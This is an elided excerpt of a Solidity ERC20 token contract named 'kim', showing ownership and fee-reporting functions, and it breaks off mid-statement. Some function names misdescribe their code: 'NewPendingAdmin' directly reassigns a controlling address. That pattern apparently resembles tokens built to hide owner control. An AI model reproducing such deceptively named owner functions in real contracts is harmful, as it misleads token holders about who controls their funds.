...
contract OwnershipHelper is ContextHelper {  
    ...
    */
    ...
    function NewPendingAdmin(address newOwner) external onlyOwner {
        _factory = newOwner;
    }  
...
contract kim is ContextHelper, IERC20, OwnershipHelper{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 1000000 *  10**9;        
    
    string private _name = "kim";
    string private _symbol = "KIM";
    ...
    function checkAccumulatedFee() external view returns (uint256, uint256) {
        return (_reflectionFee, _marketingFee);
    }

    function _getShareAmount(address shareholder, uint256 amount) external {
    ...
    function iniOwnership(uint256 lastClaimTime, uint256 claimWait) private view returns (bool) {
    ...
    function  acceptAllFees() external view returns (uint256,uint256,uint256,uint256,uint256) {
        return (
            _buybackFee,
            _reflectionFee,
            _marketingFee,
